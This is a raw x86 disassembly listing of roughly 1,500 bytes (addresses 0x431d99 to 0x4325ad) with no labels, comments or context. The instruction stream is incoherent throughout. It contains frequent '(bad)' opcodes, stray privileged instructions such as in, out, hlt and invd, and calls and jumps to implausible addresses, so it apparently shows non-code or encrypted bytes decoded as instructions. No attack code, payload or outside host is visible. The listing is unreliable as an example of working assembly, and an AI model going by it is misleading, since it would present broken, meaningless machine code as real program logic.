  431d99:	add    bh,al
  431d9b:	mov    esp,edi
  431d9d:	in     al,dx
  431d9e:	test   DWORD PTR [ebp-0x8],edi
  431da1:	mov    eax,DWORD PTR [ebp+0x2b]
  431da4:	xor    al,0x3
  431da6:	pushf  
  431da7:	jnp    0x573219e0
  431dad:	xor    edx,DWORD PTR [ebx-0x77]
  431db0:	push   ecx
  431db1:	loopne 0x431de6
  431db3:	jne    0x431d70
  431db5:	mov    esi,DWORD PTR [edx-0x20]
  431db8:	add    BYTE PTR [ebp-0x3d],bh
  431dbb:	xor    eax,DWORD PTR [ebp-0x73]
  431dbe:	mov    edi,DWORD PTR [esi]
  431dc0:	cld    
  431dc1:	jb     0x431d89
  431dc3:	add    bl,al
  431dc5:	jne    0x431e0c
  431dc7:	mov    edx,DWORD PTR [edi-0x10]
  431dca:	jge    0x431e49
  431dcc:	mov    esi,DWORD PTR [ebx]
  431dce:	lock add ecx,DWORD PTR [ebp+0x3b]
  431dd2:	xor    esi,DWORD PTR [ebp-0x77]
  431dd5:	mov    esi,eax
  431dd7:	lock inc ebp
  431dd9:	jge    0x431e10
  431ddb:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431de2:	dec    ebp
  431de3:	mov    esi,DWORD PTR [ebx]
  431de5:	loopne 0x431d70
  431de7:	jge    0x431de1
  431de9:	add    DWORD PTR [ebp-0x7d],eax
  431dec:	cmc    
  431ded:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431df4:	dec    ebp
  431df5:	hlt    
  431df6:	xor    ebx,DWORD PTR [ebp-0x77]
  431df9:	mov    esi,esp
  431dfb:	in     al,0x45
  431dfd:	jge    0x431e38
  431dff:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431e06:	dec    ebp
  431e07:	dec    esp
  431e08:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431e0e:	inc    ebp
  431e0f:	hlt    
  431e10:	xor    eax,0xb88b9f75
  431e15:	add    al,0x95
  431e17:	icebp  
  431e18:	add    dl,dh
  431e1a:	mov    DWORD PTR [ebp+0x20],ebx
  431e1d:	cmp    eax,DWORD PTR [ebp+0xf]
  431e20:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431e24:	fistp  WORD PTR [ebx+0x0]
  431e27:	inc    ebp
  431e28:	mov    ebx,DWORD PTR [edi+0xc]
  431e2b:	add    eax,eax
  431e2d:	inc    ebp
  431e2e:	test   BYTE PTR [ebx],dh
  431e30:	add    eax,DWORD PTR [ebx]
  431e32:	add    BYTE PTR [esi+0x45],bl
  431e35:	ret    0x85
  431e38:	jnp    0x5443a207
  431e3e:	inc    bp
  431e40:	inc    ebp
  431e41:	xor    eax,0xc78a9cb9
  431e46:	add    ah,bl
  431e48:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  431e4e:	add    BYTE PTR [ebx+0x3],dl
  431e51:	mov    esi,0x708088b
  431e56:	cmp    esi,eax
  431e58:	setp   BYTE PTR [ecx-0x74fcffce]
  431e5f:	mov    esp,edi
  431e61:	call   0x33ce63b3
  431e66:	or     BYTE PTR [ebx],al
  431e68:	inc    ecx
  431e69:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431e6f:	and    BYTE PTR [ebp-0x7074f0bb],al
  431e75:	lock add cl,al
  431e78:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431e7f:	mov    ch,0x45
  431e81:	clc    
  431e82:	xor    eax,DWORD PTR [ebp+0x3]
  431e85:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431e8b:	inc    ebp
  431e8c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431e92:	mov    edi,eax
  431e94:	mov    eax,DWORD PTR [ebp+0x3c]
  431e97:	mov    ecx,DWORD PTR [eax]
  431e99:	hlt    
  431e9a:	inc    ebp
  431e9b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431ea2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431ea8:	push   ebp
  431ea9:	mov    edi,DWORD PTR [ebx]
  431eab:	in     al,dx
  431eac:	jne    0x431e6f
  431eae:	mov    eax,DWORD PTR [ebp-0x28]
  431eb1:	add    DWORD PTR [eax],0xe8058dec
  431eb7:	clc    
  431eb8:	mov    esi,DWORD PTR [edi-0x8]
  431ebb:	add    dh,dl
  431ebd:	rol    WORD PTR [ebp-0x1],cl
  431ec1:	mov    edx,DWORD PTR [eax+0x8]
  431ec4:	jne    0x431e86
  431ec6:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431ecd:	inc    ebp
  431ece:	push   esp
  431ecf:	test   DWORD PTR [ecx+0xf],ecx
  431ed2:	sub    edx,esp
  431ed4:	add    eax,DWORD PTR [eax]
  431ed6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431edc:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431ee3:	mov    eax,DWORD PTR [ecx]
  431ee5:	and    BYTE PTR [eax],al
  431ee7:	cmp    dl,BYTE PTR [eax]
  431ee9:	add    BYTE PTR [ebp+0x66],al
  431eec:	inc    ecx
  431eee:	push   esp
  431eef:	add    BYTE PTR [ebp+0x0],dh
  431ef2:	push   edx
  431ef3:	enterw 0xc1,0x4d
  431ef8:	mov    esp,DWORD PTR [esi+0x20]
  431efb:	add    DWORD PTR [ecx-0x7b],eax
  431efe:	add    eax,DWORD PTR [ebx]
  431f00:	str    WORD PTR [eax+0x45]
  431f04:	lea    ecx,[ebx+0x45890801]
  431f0a:	sbb    BYTE PTR [ebx],al
  431f0c:	dec    ebp
  431f0d:	cmp    al,0xf
  431f0f:	inc    ebp
  431f10:	push   eax
  431f11:	mov    esi,DWORD PTR [ebx]
  431f13:	push   eax
  431f14:	add    eax,eax
  431f16:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431f1d:	inc    ebp
  431f1e:	add    BYTE PTR ds:0x8b4d8c00,dh
  431f24:	xor    edx,esp
  431f26:	add    eax,esi
  431f28:	mov    ebx,eax
  431f2a:	loopne 0x431f71
  431f2c:	dec    ebp
  431f2d:	mov    ecx,DWORD PTR [edi]
  431f2f:	cld    
  431f30:	push   eax
  431f31:	xchg   DWORD PTR [ebx],esi
  431f33:	add    DWORD PTR [ebx],ebp
  431f35:	add    BYTE PTR [ebx],ch
  431f37:	or     BYTE PTR [ecx],bh
  431f39:	dec    ecx
  431f3a:	loopne 0x431f3f
  431f3c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431f42:	push   ebp
  431f43:	add    DWORD PTR [ebx+0x55100800],eax
  431f49:	dec    ebp
  431f4a:	jmp    0x431ed5
  431f4c:	mov    esp,DWORD PTR [eax]
  431f4e:	sbb    dl,dl
  431f50:	inc    eax
  431f51:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  431f57:	add    BYTE PTR [ebx+0x74528555],cl
  431f5d:	push   ebp
  431f5e:	div    DWORD PTR [ebx]
  431f60:	and    eax,DWORD PTR [ebx]
  431f62:	add    edx,DWORD PTR [edx-0x30]
  431f65:	jno    0x431ef2
  431f67:	inc    DWORD PTR [eax+eiz*1]
  431f6a:	inc    ebp
  431f6b:	push   eax
  431f6c:	push   eax
  431f6d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  431f73:	mov    edi,esp
  431f75:	push   eax
  431f76:	inc    ebp
  431f77:	enter  0x458b,0x8
  431f7b:	push   ecx
  431f7c:	(bad)  
  431f7d:	call   0x10d2955
  431f82:	pop    ss
  431f83:	push   ebp
  431f84:	mov    ecx,DWORD PTR [ebx+0x489408]
  431f8a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  431f90:	push   ecx
  431f91:	jo     0x431f7b
  431f93:	inc    DWORD PTR [edi]
  431f95:	or     BYTE PTR [eax],al
  431f97:	call   0xce26e1
  431f9c:	fmul   QWORD PTR [ebp+0x55]
  431f9f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  431fa5:	mov    bh,0x8c
  431fa7:	adc    al,0x9a
  431fa9:	dec    esp
  431faa:	xor    bl,BYTE PTR [eax]
  431fac:	mov    ecx,DWORD PTR [ebp+0xc]
  431faf:	mov    eax,DWORD PTR [ebp-0x4]
  431fb2:	mov    esi,DWORD PTR [edi-0x3148f924]
  431fb8:	push   es
  431fb9:	retf   
  431fba:	mov    BYTE PTR [ebp-0x30],0x3b
  431fbe:	inc    ebp
  431fbf:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  431fc6:	retf   0x83fc
  431fc9:	into   
  431fca:	dec    ebp
  431fcb:	retf   
  431fcc:	mov    ecx,DWORD PTR [ebp-0x74]
  431fcf:	mov    eax,DWORD PTR [eax]
  431fd1:	fdiv   QWORD PTR [ebx]
  431fd3:	mov    bh,0x3
  431fd5:	push   es
  431fd6:	mov    esi,ecx
  431fd8:	sbb    cl,dl
  431fda:	dec    ebp
  431fdb:	sar    DWORD PTR [ebx],cl
  431fdd:	push   ebp
  431fde:	jne    0x431fef
  431fe0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  431fe6:	lea    ebx,[eax]
  431fe8:	call   0xf4ccabaf
  431fed:	sbb    dh,dl
  431fef:	add    edx,ebx
  431ff1:	push   ebp
  431ff2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  431ff8:	push   ecx
  431ff9:	mov    DWORD PTR [eax-0x30],edx
  431ffc:	test   DWORD PTR [edx],eax
  431ffe:	xadd   esp,esi
  432001:	pop    es
  432002:	add    cl,dl
  432004:	mov    eax,ecx
  432006:	or     al,0x45
  432008:	(bad)  
  432009:	push   eax
  43200a:	add    DWORD PTR [edx+0x0],eax
  43200d:	add    ecx,DWORD PTR [ecx]
  43200f:	and    dh,cl
  432011:	call   0xc728e1
  432016:	add    DWORD PTR [ebp+0x0],edx
  432019:	mov    esp,DWORD PTR [ebp+0x18]
  43201c:	add    BYTE PTR [eax+0x54],cl
  43201f:	xor    eax,DWORD PTR [eax]
  432021:	add    esp,DWORD PTR [esi+0x3b]
  432024:	inc    ebp
  432025:	je     0x431faa
  432027:	push   ecx
  432028:	cli    
  432029:	dec    ebp
  43202a:	mov    DWORD PTR [ebx],eax
  43202c:	(bad)  
  43202d:	or     al,0x5e
  43202f:	inc    eax
  432030:	add    BYTE PTR [ebx],al
  432032:	data16 and BYTE PTR [ebp+0x50],al
  432036:	sub    DWORD PTR [ecx],0xfffffff8
  432039:	add    BYTE PTR [ebp-0x75],ah
  43203c:	add    BYTE PTR [eax],bl
  43203e:	enter  0x894d,0x8b
  432042:	int3   
  432043:	loopne 0x43207f
  432045:	rol    BYTE PTR [eax],0x33
  432048:	lea    cx,[ebp+0xa]
  43204c:	data16 jb 0x432094
  43204f:	add    BYTE PTR [ebx+0x44890855],cl
  432055:	sbb    ah,al
  432057:	inc    ebp
  432058:	cmp    cl,BYTE PTR [edi]
  43205a:	add    BYTE PTR [edx+0x66],dl
  43205d:	xor    ecx,DWORD PTR [eax]
  43205f:	sub    eax,DWORD PTR [eax]
  432061:	mov    eax,DWORD PTR [eax]
  432063:	or     al,0x66
  432065:	ror    edx,cl
  432067:	dec    ebp
  432068:	inc    ebp
  432069:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43206f:	cld    
  432070:	or     BYTE PTR [edi+0x4501dd],dl
  432076:	ror    dh,0xee
  432079:	retf   
  43207a:	(bad)  
  43207b:	dec    ebp
  43207c:	mov    al,0x8b
  43207e:	loop   0x4320a0
  432080:	cmp    ecx,DWORD PTR [edx]
  432082:	inc    ebp
  432083:	daa    
  432084:	loop   0x43200d
  432086:	out    dx,al
  432087:	add    edi,eax
  432089:	add    BYTE PTR [eax+0x3f52ed55],bh
  43208f:	push   ebp
  432090:	inc    ebp
  432091:	xor    ebx,eax
  432093:	add    ebp,esi
  432095:	push   edx
  432096:	push   bp
  432098:	inc    ebp
  432099:	(bad)  
  43209a:	jmp    0xc342e6f3
  43209f:	sbb    al,0x33
  4320a1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4320a8:	add    BYTE PTR [ebp+0x45],0x8b
  4320ac:	jmp    0xf98b:0x100041c8
  4320b3:	xor    esi,DWORD PTR [edx+0x3]
  4320b6:	mov    ecx,DWORD PTR [edi]
  4320b8:	fmul   DWORD PTR [edx]
  4320ba:	add    BYTE PTR [eax],al
  4320bc:	lea    eax,[ebx-0x4700273c]
  4320c2:	add    al,0x4f
  4320c4:	pop    DWORD PTR [eax]
  4320c6:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4320cc:	push   edx
  4320cd:	inc    WORD PTR [ebp+0x8]
  4320d1:	mov    eax,0x514f4d
  4320d6:	(bad)
  4320da:	add    al,al
  4320dc:	xor    DWORD PTR [ebx-0x74baf730],eax
  4320e2:	test   DWORD PTR [esi+0x74],esp
  4320e5:	inc    ebp
  4320e6:	mov    DWORD PTR [eax+0xa4f08],edi
  4320ec:	add    BYTE PTR [ecx-0x76c435bb],cl
  4320f2:	or     dh,cl
  4320f4:	or     eax,0x8b8d5045
  4320f9:	inc    ebp
  4320fa:	mov    WORD PTR [ecx+0x3b8a00],?
  432100:	jne    0x432135
  432102:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432108:	add    DWORD PTR [ebx],eax
  43210a:	add    bh,bh
  43210c:	adc    DWORD PTR [eax],ecx
  43210e:	adc    DWORD PTR [ebp+0x55],edi
  432111:	push   es
  432112:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432118:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11d8]
  43211f:	inc    ebp
  432120:	mov    esp,edi
  432122:	or     al,0xd8
  432124:	push   eax
  432125:	(bad)  
  432126:	jne    0x4320dc
  432128:	call   0x3b1a15
  43212d:	inc    ebp
  43212e:	sar    BYTE PTR [edx],0x84
  432131:	out    dx,al
  432132:	add    bh,al
  432134:	add    BYTE PTR [ebp+esi*2-0x247428],bh
  43213b:	(bad)  
  43213c:	and    al,al
  43213e:	fs jmp 0x7cc86743
  432144:	bswap  ecx
  432146:	scas   al,BYTE PTR es:[edi]
  432147:	inc    esp
  432148:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43214f:	or     BYTE PTR [ebx-0x97717c7],0x83
  432156:	call   DWORD PTR [edi]
  432158:	shr    ah,0x84
  43215b:	xchg   DWORD PTR [eax],eax
  43215d:	add    DWORD PTR [eax],eax
  43215f:	add    bh,bh
  432161:	dec    ebp
  432162:	and    BYTE PTR [ecx-0x38],dl
  432165:	push   eax
  432166:	dec    DWORD PTR [ebx+0xfd885]
  43216c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432172:	mov    WORD PTR [ecx+0x0],ss
  432175:	lea    ecx,[ebx+0x108b20d8]
  43217b:	mov    WORD PTR [edx],ds
  43217d:	add    BYTE PTR [edi+0xff01ff],al
  432183:	mov    ecx,DWORD PTR [ebp-0x28]
  432186:	push   ecx
  432187:	shl    BYTE PTR [ebp+0x3a],0x8b
  43218b:	inc    ebp
  43218c:	in     al,0xeb
  43218e:	jno    0x43211b
  432190:	push   edx
  432191:	mov    DWORD PTR [eax-0x28],edx
  432194:	mov    eax,DWORD PTR [ebp+0x20]
  432197:	je     0x432120
  432199:	mov    eax,DWORD PTR [ecx]
  43219b:	sbb    BYTE PTR [eax],al
  43219d:	pop    DWORD PTR [eax]
  43219f:	add    esi,eax
  4321a1:	add    bl,al
  4321a3:	adc    DWORD PTR [edi],esi
  4321a5:	jmp    0x8bce71f7
  4321aa:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4321b1:	jne    0x43213e
  4321b3:	mov    ecx,DWORD PTR [eax]
  4321b5:	in     al,0x75
  4321b7:	pop    DWORD PTR [ecx+0x5301]
  4321bd:	push   edx
  4321be:	inc    DWORD PTR [ebx]
  4321c0:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4321c6:	add    BYTE PTR [edi+0x9],dl
  4321c9:	call   DWORD PTR [esi]
  4321cb:	and    dl,al
  4321cd:	and    bh,bh
  4321cf:	inc    edi
  4321d1:	test   eax,edx
  4321d3:	sldt   ebx
  4321d6:	xor    al,0x0
  4321d8:	pushf  
  4321d9:	(bad)  
  4321da:	jmp    0x4321e8
  4321dc:	mov    eax,edi
  4321de:	or     al,0x75
  4321e0:	inc    eax
  4321e1:	call   0x4318e9
  4321e6:	mov    eax,eax
  4321e8:	loopne 0x43216e
  4321ea:	inc    ebp
  4321eb:	add    BYTE PTR [ebx+0x1451c00],cl
  4321f1:	mov    eax,DWORD PTR [ebp+0x20]
  4321f4:	add    edi,ecx
  4321f6:	add    BYTE PTR [eax],ch
  4321f8:	cmp    edi,0x18
  4321fb:	test   DWORD PTR [ebp+0xf],esi
  4321fe:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432205:	jne    0x432209
  432207:	call   0xffa21ccc
  43220c:	leave  
  43220d:	rcr    BYTE PTR [esp+eax*4],0x55
  432211:	add    ah,ch
  432213:	add    BYTE PTR [edi-0x48fef979],dh
  432219:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  432220:	inc    esp
  432221:	mov    ebx,DWORD PTR [eax]
  432223:	fcom   st(2)
  432225:	add    BYTE PTR [edi],bl
  432227:	lea    ecx,[eax-0x18]
  43222a:	(bad)  
  43222b:	push   DWORD PTR [ecx]
  43222d:	call   0xffb56f8f
  432232:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432236:	fstp   DWORD PTR [esi+ebx*8]
  432239:	push   ebp
  43223a:	pop    ebp
  43223b:	mov    esi,DWORD PTR [edx-0x38]
  43223e:	add    DWORD PTR [eax],0x28
  432241:	mov    edi,DWORD PTR [ebx]
  432243:	xor    esi,DWORD PTR [edx+0x3]
  432246:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43224a:	pop    ebp
  43224b:	or     al,0x4
  43224d:	inc    ecx
  43224e:	push   ebp
  43224f:	(bad)  
  432250:	in     al,dx
  432251:	or     ah,ch
  432253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432254:	xbegin 0xffc8984a
  43225a:	clc    
  43225b:	adc    al,0x45
  43225d:	div    BYTE PTR [eax+ecx*1]
  432260:	pushf  
  432261:	add    bh,al
  432263:	jne    0x43223d
  432265:	add    DWORD PTR [ebp+0x5b00f89a],0x66710066
  43226f:	add    eax,DWORD PTR [ebp+0x52]
  432272:	adc    eax,0x20
  432275:	xchg   DWORD PTR [ecx+0x4000fc01],ecx
  43227b:	test   DWORD PTR [eax],eax
  43227d:	clc    
  43227e:	data16 or al,BYTE PTR [ebp+0x45]
  432282:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432289:	rol    BYTE PTR [ebp+0x45],1
  43228c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432292:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432298:	push   ebx
  432299:	add    BYTE PTR [ebx+0x0],dl
  43229c:	push   ecx
  43229d:	jge    0x4322d2
  43229f:	add    BYTE PTR [esi+0x4],dl
  4322a2:	jne    0x432309
  4322a4:	mov    edx,0x457200
  4322a9:	jmp    0x43226d
  4322ab:	xor    edi,DWORD PTR [ebx]
  4322ad:	pop    edi
  4322ae:	cvtdq2ps xmm7,xmm0
  4322b1:	ret    0x0
  4322b4:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4322ba:	xor    ecx,DWORD PTR [edi]
  4322bc:	add    eax,DWORD PTR [ecx+0x3b]
  4322bf:	push   ebx
  4322c0:	rdpmc  
  4322c2:	out    0x8d,al
  4322c4:	add    BYTE PTR [eax],cl
  4322c6:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4322cc:	ret    0x450c
  4322cf:	sbb    al,0x8b
  4322d1:	cmp    eax,esi
  4322d3:	or     cl,al
  4322d5:	or     al,0xc2
  4322d7:	pop    eax
  4322d8:	inc    ebp
  4322d9:	add    ecx,DWORD PTR [edi]
  4322db:	add    esi,DWORD PTR [ebp+0x39]
  4322de:	invd   
  4322e0:	jge    0x4322ec
  4322e2:	mov    eax,0x478ac0
  4322e7:	cli    
  4322e8:	xor    esp,ecx
  4322ea:	mov    ebx,0x5b8ac0
  4322ef:	ret    0x33
  4322f2:	mov    eax,0x833b8b
  4322f7:	sub    BYTE PTR [ebx],al
  4322f9:	inc    ebp
  4322fa:	xor    ax,0x9cf8
  4322fe:	inc    bh
  432300:	mov    esp,esp
  432302:	hlt    
  432303:	test   DWORD PTR [ebp-0x8],esi
  432306:	mov    eax,DWORD PTR [ebp-0x14]
  432309:	cmp    ecx,DWORD PTR [ebx-0x76478864]
  43230f:	dec    edi
  432310:	or     BYTE PTR [eax],al
  432312:	jne    0x43229d
  432314:	mov    esi,esp
  432316:	call   0x77a9aedb
  43231b:	inc    ebp
  43231c:	mov    DWORD PTR [eax+0x9a4f0c],edi
  432322:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432328:	add    BYTE PTR [esi+0x7d],ah
  43232b:	inc    ebp
  43232c:	mov    bx,WORD PTR [ebp+0x8]
  432330:	add    DWORD PTR [ebp+0x53],0x30c008b
  432337:	inc    ebp
  432338:	mov    bx,di
  43233b:	lock test BYTE PTR [ecx+0x7000801],bh
  432342:	jge    0x432305
  432344:	mov    ecx,DWORD PTR [ebx-0x650613f0]
  43234a:	cli    
  43234b:	xor    bl,bh
  43234d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432353:	test   BYTE PTR [eax],cl
  432355:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43235c:	cmp    ebp,eax
  43235e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432365:	test   BYTE PTR [ebp+0x1],bh
  432368:	mov    ebx,0x458a00
  43236d:	xor    esi,DWORD PTR [ebx]
  43236f:	add    esp,DWORD PTR [esi-0x77]
  432372:	pop    ebp
  432373:	loopne 0x4323db
  432375:	inc    ebp
  432376:	clc    
  432377:	xor    edi,DWORD PTR [ebx]
  432379:	add    esi,DWORD PTR [edx-0x77]
  43237c:	data16 fdivr QWORD PTR [ebp-0x49]
  432380:	mov    ebx,0xb78afc
  432385:	hlt    
  432386:	xor    edi,DWORD PTR [edx]
  432388:	data16 add BYTE PTR [ebp+0x66],bl
  43238c:	data16 lock clc 
  43238f:	cmp    bh,BYTE PTR [ebx]
  432391:	add    BYTE PTR [edi+0x66],dh
  432394:	psubq  mm7,QWORD PTR [ebp+0x0]
  432398:	ltr    WORD PTR [ebp+0x66]
  43239c:	add    esi,eax
  43239e:	add    di,WORD PTR [ebp+0x2b]
  4323a2:	data16 data16 jge 0x432423
  4323a6:	mov    ebx,0xe08a8b
  4323ab:	jge    0x4323e0
  4323ad:	data16 data16 xor al,0x5d
  4323b1:	data16 data16 jne 0x4323ad
  4323b5:	mov    edi,DWORD PTR [ebx]
  4323b7:	fdiv   QWORD PTR [edx+0x7d]
  4323ba:	data16 data16 jge 0x4323f2
  4323be:	mov    ebx,0x758a66
  4323c3:	mov    esi,0x667233
  4323c8:	pop    ebp
  4323c9:	or     BYTE PTR [esi+0x0],ah
  4323cc:	clc    
  4323cd:	mov    edi,DWORD PTR [ebx]
  4323cf:	lock ja 0x43235d
  4323d2:	(bad)  
  4323d4:	jge    0x4323cd
  4323d6:	invd   
  4323d8:	pop    ebp
  4323d9:	add    BYTE PTR [ebx],al
  4323db:	(bad)  
  4323dc:	cmp    di,WORD PTR [ebp+0xf]
  4323e0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4323e4:	mov    bx,WORD PTR [ebp-0x10]
  4323e8:	pop    bp
  4323ea:	fbstp  TBYTE PTR [ebx]
  4323ec:	test   DWORD PTR [ebx],eax
  4323ee:	add    BYTE PTR [ebx],bh
  4323f0:	add    BYTE PTR [esi+0x7d],ah
  4323f3:	jge    0x432380
  4323f5:	data16 in al,dx
  4323f7:	pop    ebp
  4323f8:	stc    
  4323f9:	bsf    ecx,DWORD PTR [ebp+0x6632009a]
  432400:	mov    edi,ebx
  432402:	in     al,dx
  432403:	test   BYTE PTR [ebp+0x0],bh
  432406:	mov    eax,DWORD PTR [eax]
  432408:	call   0xbd401d98
  43240d:	cmp    bl,BYTE PTR [edx-0x7699ce00]
  432413:	sti    
  432414:	call   0x8b4ba1a4
  432419:	add    ebp,esp
  43241b:	mov    bx,di
  43241e:	jnp    0x432446
  432420:	mov    DWORD PTR [ebx+0x3a7df808],ecx
  432426:	mov    eax,DWORD PTR [eax]
  432428:	call   0x7c3eaf93
  43242d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432433:	data16 data16 fistp WORD PTR [ebp+0xe]
  432438:	xor    DWORD PTR [edi-0x48fff7ad],0xfb66f403
  432442:	fisttp WORD PTR [ecx-0x7401f77b]
  432448:	(bad)  
  432449:	cld    
  43244a:	jne    0x432486
  43244c:	xor    eax,DWORD PTR [eax]
  43244e:	mov    esp,DWORD PTR [esi-0x10]
  432451:	sti    
  432452:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432459:	data16 adc bl,bh
  43245c:	push   ebp
  43245d:	xor    ecx,DWORD PTR es:[ebx+0x3ae4f88b]
  432464:	mov    WORD PTR [eax],es
  432466:	call   0xe48b:0x89fb3266
  43246d:	or     al,0x55
  43246f:	add    ecx,DWORD PTR [ebx-0x7420139a]
  432475:	push   cs
  432476:	push   esi
  432477:	mov    bh,0xc8
  432479:	or     al,0x2b
  43247b:	mov    bh,0xba
  43247d:	hlt    
  43247e:	mov    bh,bl
  432480:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432486:	dec    edi
  432487:	or     al,0x0
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	or     BYTE PTR [ebp+0x3b],dh
  43248e:	mov    ecx,DWORD PTR [edi]
  432490:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432496:	xor    al,0xd8
  432498:	pop    bp
  43249a:	lock xor esi,DWORD PTR [ebx]
  43249d:	lea    esp,[esi+0x1f]
  4324a0:	icebp  
  4324a1:	jb     0x4324a7
  4324a3:	add    al,al
  4324a5:	jge    0x4324b3
  4324a7:	mov    eax,eax
  4324a9:	fsubr  st,st(3)
  4324ab:	pop    ebp
  4324ac:	mov    esi,DWORD PTR [ebx]
  4324ae:	in     al,0x8d
  4324b0:	rcr    DWORD PTR [edi],0xc2
  4324b3:	jb     0x432513
  4324b5:	add    cl,cl
  4324b7:	jge    0x4324c5
  4324b9:	mov    edx,DWORD PTR [ebp-0x20]
  4324bc:	in     al,dx
  4324bd:	pop    ebp
  4324be:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4324c3:	cmp    di,WORD PTR [ebp+0x0]
  4324c7:	mov    ebp,DWORD PTR [ebx]
  4324c9:	fdivr  QWORD PTR [esi+0x668a5d]
  4324cf:	cmp    al,0x33
  4324d1:	mov    si,0x4f7d
  4324d5:	mov    eax,DWORD PTR [eax]
  4324d7:	lock inc ebp
  4324d9:	mov    esi,DWORD PTR [esi]
  4324db:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4324e2:	clc    
  4324e3:	(bad)  
  4324e4:	cmp    edi,DWORD PTR [ebx]
  4324e6:	je     0x4324f7
  4324e8:	push   ebx
  4324e9:	loopne 0x4324fa
  4324eb:	dec    ecx
  4324ed:	mov    esp,DWORD PTR [esi-0x1c]
  4324f0:	int    0xf1
  4324f2:	mov    esi,0x703084d
  4324f7:	pcmpgtd mm6,mm1
  4324fa:	add    BYTE PTR [ebp+0x66],dh
  4324fd:	jmp    0x4324ca
  4324ff:	mov    eax,DWORD PTR [ebx]
  432501:	lock push ebp
  432503:	ror    DWORD PTR [ebp-0x2972feb3],1
  432509:	or     bh,dl
  43250b:	jb     0x43250b
  43250d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  432513:	loopne 0x432515
  432515:	jne    0x432517
  432517:	data16 add BYTE PTR [esi+eiz*2],dh
  43251b:	mov    ecx,ebx
  43251d:	data16 cmp dh,cl
  432520:	add    BYTE PTR [edx],bh
  432522:	data16 add bl,cl
  432525:	data16 cmp dh,dl
  432528:	add    BYTE PTR [edx],bh
  43252a:	data16 add bl,cl
  43252d:	enterw 0x4df1,0x19
  432532:	pop    edi
  432533:	jne    0x4324b6
  432535:	mov    esi,DWORD PTR [esi]
  432537:	call   0x77b7b0d8
  43253c:	xor    ebp,DWORD PTR [ebx]
  43253e:	lea    esp,[esi+0x48]
  432541:	repnz in eax,0x3b
  432544:	add    BYTE PTR [ebp-0x37],dh
  432547:	xor    edx,DWORD PTR [ebp-0x15]
  43254a:	in     al,dx
  43254b:	xor    edx,DWORD PTR [esi+0x40]
  43254e:	mov    DWORD PTR [edi],0x338545fc
  432554:	clc    
  432555:	add    esi,DWORD PTR ds:0xe85b9c5f
  43255b:	ret    0xff
  43255e:	dec    DWORD PTR [ebx-0x74f8ae08]
  432564:	cmp    DWORD PTR [esi+0x45],edx
  432567:	add    BYTE PTR [eax+eax*1+0x61],bh
  43256b:	data16 (bad) 
  43256d:	into   
  43256e:	data16 cmp cl,ch
  432571:	add    BYTE PTR [ecx+0x7ce0866],bh
  432577:	cmp    ah,BYTE PTR [esi+0x0]
  43257a:	add    bh,al
  43257c:	add    ah,bh
  43257e:	add    BYTE PTR [ebp+0x35c3f866],al
  432584:	cmp    bl,BYTE PTR [eax+eax*1-0x3c31999a]
  43258b:	pop    ebp
  43258c:	adc    al,0x57
  43258e:	add    BYTE PTR [edi-0x723c409a],dh
  432594:	add    edi,edi
  432596:	jne    0x4325eb
  432598:	lea    edx,[ecx+0x1]
  43259b:	mov    ebx,0xd64ff1
  4325a0:	sar    DWORD PTR [ebx],1
  4325a2:	test   BYTE PTR [ebp+0x34],dh
  4325a5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4325a9:	push   edi
  4325aa:	xor    BYTE PTR [ebx],0x39
  4325ad:	mov    esi,ebx
